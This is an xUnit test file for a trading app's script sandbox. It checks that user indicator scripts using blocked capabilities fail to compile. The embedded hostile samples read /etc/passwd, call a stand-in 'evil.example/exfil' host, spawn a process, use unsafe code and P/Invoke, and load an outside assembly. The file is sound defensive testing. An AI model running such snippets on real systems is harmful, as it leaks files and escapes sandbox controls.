using System;
using System.Threading.Tasks;
using AccessibleTrader.Core.Services;
using AccessibleTrader.Core.Services.Scripting;
using Xunit;

namespace AccessibleTrader.Tests;

/// <summary>
/// Defense-in-depth tests for the phase-4 script sandbox. Each test
/// compiles an indicator that deliberately reaches for a blocked
/// capability (filesystem, network, process-spawn, unsafe code, P/Invoke)
/// and asserts the compile is rejected with a sandbox-origin error.
///
/// <para>
/// These exercise the in-worker Roslyn semantic sandbox +
/// lexical pre-flight — the first layer in the defense stack. They
/// run on any platform (the compile pipeline is platform-agnostic),
/// unlike the OS-level AppContainer / sandbox-exec / isolatedProcess
/// layers which can only be verified on their target OS. If any test
/// here starts passing (i.e. the compile succeeds when it should fail)
/// that's a direct regression of the semantic sandbox — the second-layer
/// OS sandbox would still block runtime execution, but defense-in-depth
/// has lost a layer and needs fixing.
/// </para>
///
/// <para>
/// Scope note: we assert the compile returns <c>Success=false</c>. We
/// deliberately don't assert the exact wording of the error message —
/// that would couple the test to message strings that change as the
/// sandbox evolves. The assertion is simply "compilation was refused."
/// </para>
/// </summary>
public class HostileScriptTests
{
    private static RoslynScriptingService NewScripting() =>
        new RoslynScriptingService(
            workerLauncher: new DefaultProcessLauncher(),
            // Bogus path — these tests expect compile-time rejection, so
            // we should never reach the worker-spawn step. If we do, the
            // File.Exists check fires a clear diagnostic.
            workerPathResolver: () => "/__hostile_script_test_never_used__");

    [Fact]
    public async Task Rejects_FileSystemAccess_ViaFileClass()
    {
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_FS";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    // Direct reference to System.IO.File — should be refused
                    // by the semantic sandbox walker before Emit.
                    var _ = System.IO.File.ReadAllText("/etc/passwd");
                    return new[] { new double[data.Length] };
                }
            }
            """;
        var result = await NewScripting().CompileIndicatorAsync(src);
        Assert.False(result.Success, "Sandbox regression: a direct System.IO.File reference compiled successfully.");
    }

    [Fact]
    public async Task Rejects_HttpClient()
    {
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_HTTP";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    using var http = new System.Net.Http.HttpClient();
                    var _ = http.GetStringAsync("https://evil.example/exfil").Result;
                    return new[] { new double[data.Length] };
                }
            }
            """;
        var result = await NewScripting().CompileIndicatorAsync(src);
        Assert.False(result.Success, "Sandbox regression: System.Net.Http.HttpClient compiled successfully.");
    }

    [Fact]
    public async Task Rejects_ProcessStart()
    {
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_PROC";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    System.Diagnostics.Process.Start("calc.exe");
                    return new[] { new double[data.Length] };
                }
            }
            """;
        var result = await NewScripting().CompileIndicatorAsync(src);
        Assert.False(result.Success, "Sandbox regression: System.Diagnostics.Process.Start compiled successfully.");
    }

    [Fact]
    public async Task Rejects_UnsafeBlock_ViaLexicalPreflight()
    {
        const string src = """
            public sealed unsafe class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_UNSAFE";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    int x = 42;
                    int* p = &x;
                    return new[] { new double[] { *p } };
                }
            }
            """;
        var result = await NewScripting().CompileIndicatorAsync(src);
        Assert.False(result.Success, "Sandbox regression: unsafe code compiled successfully.");
    }

    [Fact]
    public async Task Rejects_DllImport_ViaLexicalPreflight()
    {
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_DLLIMPORT";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                [System.Runtime.InteropServices.DllImport("kernel32.dll")]
                private static extern uint GetCurrentProcessId();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    return new[] { new double[] { GetCurrentProcessId() } };
                }
            }
            """;
        var result = await NewScripting().CompileIndicatorAsync(src);
        Assert.False(result.Success, "Sandbox regression: [DllImport] P/Invoke compiled successfully.");
    }

    [Fact]
    public async Task Rejects_AssemblyLoad_ReflectionBypass()
    {
        // A classic escape attempt: use reflection to load an arbitrary
        // assembly. The semantic sandbox should recognise the
        // System.Reflection.Assembly.LoadFrom reference and refuse.
        const string src = """
            public sealed class EvilIndicator : ICustomIndicator
            {
                public string Id => "EVIL_REFLECT";
                public string DisplayName => "evil";
                public string[] ComponentNames => new[] { "x" };
                public ComponentDisplayType[] DisplayTypes => new[] { ComponentDisplayType.Line };
                public Dictionary<string, double> DefaultParameters => new();

                public double[][] Calculate(System.ReadOnlySpan<Ohlcv> data, Dictionary<string, double> parameters)
                {
                    var asm = System.Reflection.Assembly.LoadFrom("/tmp/evil.dll");
                    return new[] { new double[data.Length] };
                }
            }
            """;
        var result = await NewScripting().CompileIndicatorAsync(src);
        Assert.False(result.Success, "Sandbox regression: System.Reflection.Assembly.LoadFrom compiled successfully.");
    }
}
